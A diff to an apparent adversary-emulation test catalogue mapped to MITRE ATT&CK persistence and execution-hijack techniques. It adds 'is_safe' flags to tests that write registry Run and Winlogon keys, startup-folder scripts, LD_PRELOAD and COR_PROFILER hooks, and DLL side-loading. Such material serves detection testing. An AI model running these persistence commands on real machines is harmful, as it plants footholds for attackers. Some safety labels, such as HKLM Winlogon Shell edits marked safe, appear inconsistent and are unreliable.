       cleanup: "$PyBin = if (Get-Command \"python.exe\" -ErrorAction SilentlyContinue) { \"python.exe\" } elseif (Get-Command \"python3.exe\" -ErrorAction SilentlyContinue) { \"python3.exe\" } else { \"python.exe\" }; \n$UserDir = & $PyBin -S -c \"import site; print(site.getusersitepackages())\"\nif (-not (Get-ChildItem -Path $UserDir -Recurse -ErrorAction SilentlyContinue | Where-Object Name -like 'usercustomize*')) { Write-Host \"[!] Artifact missing: $UserDir\\usercustomize.py - [-] Please Run : Invoke-AtomicTest T1546.018\"; exit 1 };\nGet-ChildItem -Path \"$UserDir\" -Recurse -Force |\nWhere-Object { $_.Name -like \"usercustomize*\" } |\nRemove-Item -Force \nWrite-Host \"[+] Successfully Removed usercustomize.py under $UserDir\"\nGet-Process -Name \"Calc*\", \"calc*\" -ErrorAction SilentlyContinue | Stop-Process -Force\nWrite-Host \"[+] Successfully Terminated Calculator\""
       timeout: 120
+      is_safe: true
     - name: Python Startup Hook - atomic_hook.pth (Linux)
       type: sh
       platform: linux
@@ -1116,6 +1182,7 @@
         rm -rf /tmp/atomic_hook_poc.txt
         echo "[+] Successful Removed atomic_hook_poc.txt under /tmp"
       timeout: 60
+      is_safe: true
     - name: Python Startup Hook - atomic_hook.pth (macOS)
       type: sh
       platform: macos
@@ -1133,6 +1200,7 @@
         [ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
         echo "[+] Successful Removed atomic_hook.pth and terminated Calculator"
       timeout: 60
+      is_safe: true
     - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
       type: sh
       platform: linux
@@ -1152,6 +1220,7 @@
         rm -rf /tmp/poc.txt
         echo "[+] Successful remove poc.txt under /tmp"
       timeout: 60
+      is_safe: true
     - name: Python Startup Hook - usercustomize.py (Linux / MacOS)
       type: sh
       platform: macos
@@ -1171,9 +1240,10 @@
         rm -rf /tmp/poc.txt
         echo "[+] Successful remove poc.txt under /tmp"
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1546/018
-  is_safe: false
+  is_safe: true
 - id: T1547
   name: Boot or Logon Autostart Execution
   description: 'Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may inc...'
@@ -1191,11 +1261,13 @@
       platform: windows
       command: pnputil.exe /add-driver "C:\Windows\INF\usbstor.inf"
       timeout: 120
+      is_safe: true
     - name: Driver Installation Using pnputil.exe
       type: powershell
       platform: windows
       command: pnputil.exe -i -a C:\Windows\INF\acpipmi.inf
       timeout: 120
+      is_safe: true
     - name: Leverage Virtual Channels to execute custom DLL during successful RDP session
       type: cmd
       platform: windows
@@ -1203,9 +1275,10 @@
       cleanup: reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware" /f
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547
-  is_safe: false
+  is_safe: true
 - id: T1547.001
   name: Registry Run Keys / Startup Folder
   description: |-
@@ -1227,6 +1300,7 @@
       command: REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
       cleanup: REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Reg Key RunOnce
       type: cmd
       platform: windows
@@ -1234,6 +1308,7 @@
       cleanup: REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: PowerShell Registry RunOnce
       type: powershell
       platform: windows
@@ -1243,6 +1318,7 @@
       cleanup: Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Suspicious vbs file run from startup Folder
       type: powershell
       platform: windows
@@ -1256,6 +1332,7 @@
         Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Suspicious jse file run from startup Folder
       type: powershell
       platform: windows
@@ -1269,6 +1346,7 @@
         Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Suspicious bat file run from startup Folder
       type: powershell
       platform: windows
@@ -1282,6 +1360,7 @@
         Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Add Executable Shortcut Link to User Startup Folder
       type: powershell
       platform: windows
@@ -1295,12 +1374,14 @@
       cleanup: Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Add persistance via Recycle bin
       type: cmd
       platform: windows
       command: reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
       cleanup: reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
       timeout: 120
+      is_safe: true
     - name: SystemBC Malware-as-a-Service Registry
       type: powershell
       platform: windows
@@ -1309,6 +1390,7 @@
         Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"
       cleanup: Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "socks5_powershell" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
       type: powershell
       platform: windows
@@ -1321,6 +1403,7 @@
         Remove-Item "$env:TMP\atomictest\" -Recurse -Force
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
       type: powershell
       platform: windows
@@ -1332,6 +1415,7 @@
         Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
         Remove-Item "$env:TMP\atomictest\" -Recurse -Force
       timeout: 120
+      is_safe: true
     - name: HKCU - Policy Settings Explorer Run Key
       type: powershell
       platform: windows
@@ -1346,6 +1430,7 @@
       cleanup: Remove-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: HKLM - Policy Settings Explorer Run Key
       type: powershell
       platform: windows
@@ -1357,6 +1442,7 @@
       cleanup: Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: HKLM - Append Command to Winlogon Userinit KEY Value
       type: powershell
       platform: windows
@@ -1371,6 +1457,7 @@
         Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup'
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: 'HKLM - Modify default System Shell - Winlogon Shell KEY Value '
       type: powershell
       platform: windows
@@ -1385,6 +1472,7 @@
         Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup'
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: secedit used to create a Run key in the HKLM Hive
       type: cmd
       platform: windows
@@ -1394,6 +1482,7 @@
       cleanup: REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "calc" /f >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Modify BootExecute Value
       type: powershell
       platform: windows
@@ -1405,6 +1494,7 @@
         Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Allowing custom application to execute during new RDP logon session
       type: cmd
       platform: windows
@@ -1412,6 +1502,7 @@
       cleanup: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "rdpclip"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Creating Boot Verification Program Key for application execution during successful boot
       type: cmd
       platform: windows
@@ -1419,6 +1510,7 @@
       cleanup: reg delete HKLM\System\CurrentControlSet\Control\BootVerificationProgram /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Add persistence via Windows Context Menu
       type: cmd
       platform: windows
@@ -1426,9 +1518,10 @@
       cleanup: reg delete "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify" /f
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/001
-  is_safe: false
+  is_safe: true
 - id: T1547.002
   name: Authentication Package
   description: |-
@@ -1453,6 +1546,7 @@
         rm -force C:\windows\system32\package.dll
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/002
   is_safe: false
@@ -1486,6 +1580,7 @@
         net start w32time
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Edit an existing time provider
       type: powershell
       platform: windows
@@ -1505,6 +1600,7 @@
         net start w32time
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/003
   is_safe: false
@@ -1524,12 +1620,14 @@
       command: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
       cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Winlogon Userinit Key Persistence - PowerShell
       type: powershell
       platform: windows
       command: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
       cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Winlogon Notify Key Logon Persistence - PowerShell
       type: powershell
       platform: windows
@@ -1541,21 +1639,24 @@
         Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
       cleanup: Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Winlogon HKLM Shell Key Persistence - PowerShell
       type: powershell
       platform: windows
       command: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
       cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Winlogon HKLM Userinit Key Persistence - PowerShell
       type: powershell
       platform: windows
       command: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
       cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1547/004
-  is_safe: false
+  is_safe: true
 - id: T1547.005
   name: Security Support Provider
   description: |-
@@ -1583,6 +1684,7 @@
         Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old';
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry
       type: powershell
       platform: windows
@@ -1597,6 +1699,7 @@
         Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old';
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/005
   is_safe: false
@@ -1623,6 +1726,7 @@
         [ -f /tmp/T1547.006/safe_to_delete ] && rm -rf /tmp/T1547.006
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: MacOS - Load Kernel Module via kextload and kmutil
       type: bash
       platform: macos
@@ -1636,6 +1740,7 @@
         sudo kmutil unload -p /Library/Extensions/SoftRAID.kext
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: MacOS - Load Kernel Module via KextManagerLoadKextWithURL()
       type: bash
       platform: macos
@@ -1646,6 +1751,7 @@
       cleanup: rm -f /tmp/T1547006_iokit_loader
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/006
   is_safe: false
@@ -1665,6 +1771,7 @@
       command: cp PathToAtomicsFolder/T1547.007/src/reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
       cleanup: rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
       timeout: 60
+      is_safe: true
     - name: Re-Opened Applications using LoginHook
       type: sh
       platform: macos
@@ -1672,6 +1779,7 @@
       cleanup: sudo defaults delete com.apple.loginwindow LoginHook
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Append to existing loginwindow for Re-Opened Applications
       type: sh
       platform: macos
@@ -1693,9 +1801,10 @@
         fi
         mv /tmp/t1547007_loginwindow-backup.plist ${FILE}
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1547/007
-  is_safe: false
+  is_safe: true
 - id: T1547.008
   name: LSASS Driver
   description: Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service...
@@ -1713,6 +1822,7 @@
       cleanup: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS" -Name "LsaDbExtPt" -ErrorAction Ignore | Out-Null
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/008
   is_safe: false
@@ -1738,6 +1848,7 @@
         %temp%\T1547.009_modified_shortcut.url
       cleanup: del -f %temp%\T1547.009_modified_shortcut.url >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Create shortcut to cmd in startup folders
       type: powershell
       platform: windows
@@ -1762,9 +1873,10 @@
         Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/009
-  is_safe: false
+  is_safe: true
 - id: T1547.010
   name: Port Monitors
   description: "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) \n\nAlternatively, an arbitrary DLL can be loaded if ..."
@@ -1782,6 +1894,7 @@
       cleanup: reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/010
   is_safe: false
@@ -1818,6 +1931,7 @@
         net start spooler
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/012
   is_safe: false
@@ -1843,6 +1957,7 @@
         Remove-Item "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" -Force -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: HKLM - Add malicious StubPath value to existing Active Setup Entry
       type: powershell
       platform: windows
@@ -1854,6 +1969,7 @@
         Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Force
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number
       type: powershell
       platform: windows
@@ -1862,6 +1978,7 @@
         & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1547/014
   is_safe: false
@@ -1881,9 +1998,10 @@
       command: osascript PathToAtomicsFolder/T1547.015/src/add_login_item.osa
       cleanup: osascript PathToAtomicsFolder/T1547.015/src/remove_login_item.osa
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1547/015
-  is_safe: false
+  is_safe: true
 - id: T1574.001
   name: DLL
   description: |-
@@ -1913,6 +2031,7 @@
         del %APPDATA%\amsi.dll >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Phantom Dll Hijacking - WinAppXRT.dll
       type: cmd
       platform: windows
@@ -1927,6 +2046,7 @@
         del %APPDATA%\WinAppXRT.dll
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Phantom Dll Hijacking - ualapi.dll
       type: cmd
       platform: windows
@@ -1940,12 +2060,14 @@
         del %APPDATA%\ualapi.dll
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: DLL Side-Loading using the Notepad++ GUP.exe binary
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\T1574.002\bin\GUP.exe"'
       cleanup: taskkill /F /IM calculator.exe >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: DLL Side-Loading using the dotnet startup hook environment variable
       type: cmd
       platform: windows
@@ -1955,6 +2077,7 @@
         echo.
       cleanup: taskkill /F /IM calculator.exe >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
       type: powershell
       platform: windows
@@ -1977,9 +2100,10 @@
         Write-Host 2.KeyScrambler cleanup completed successfully.
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1574/001
-  is_safe: false
+  is_safe: true
 - id: T1574.006
   name: Dynamic Linker Hijacking
   description: 'Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo D...'
@@ -1999,11 +2123,13 @@
       cleanup: sudo sed -i 's#/tmp/T1574006.so##' /etc/ld.so.preload
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Shared Library Injection via LD_PRELOAD
       type: bash
       platform: linux
       command: LD_PRELOAD=/tmp/T1574006.so ls
       timeout: 60
+      is_safe: true
     - name: Dylib Injection via DYLD_INSERT_LIBRARIES
       type: bash
       platform: macos
@@ -2012,9 +2138,10 @@
         kill `pgrep Calculator`
         kill `pgrep firefox`
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1574/006
-  is_safe: false
+  is_safe: true
 - id: T1574.008
   name: Path Interception by Search Order Hijacking
   description: |-
@@ -2039,9 +2166,10 @@
         Remove-Item "$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" -ErrorAction Ignore
         Stop-Process -Name "calculator"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1574/008
-  is_safe: false
+  is_safe: true
 - id: T1574.009
   name: Path Interception by Unquoted Path
   description: |-
@@ -2072,6 +2200,7 @@
         del "C:\Time.log" >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1574/009
   is_safe: false
@@ -2093,15 +2222,17 @@
         get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
         get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL
       timeout: 120
+      is_safe: true
     - name: Service ImagePath Change with reg.exe
       type: cmd
       platform: windows
       command: reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\calcservice" /f /v ImagePath /d "%windir%\system32\cmd.exe"
       cleanup: sc.exe delete calcservice
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1574/011
-  is_safe: false
+  is_safe: true
 - id: T1574.012
   name: COR_PROFILER
   description: 'Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microso...'
@@ -2126,6 +2257,7 @@
         START MMC.EXE EVENTVWR.MSC
       cleanup: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"
       timeout: 120
+      is_safe: true
     - name: System Scope COR_PROFILER
       type: powershell
       platform: windows
@@ -2140,6 +2272,7 @@
         Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Registry-free process scope COR_PROFILER
       type: powershell
       platform: windows
@@ -2153,6 +2286,7 @@
         $env:COR_PROFILER = ''
         $env:COR_PROFILER_PATH = ''
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1574/012
-  is_safe: false
+  is_safe: true
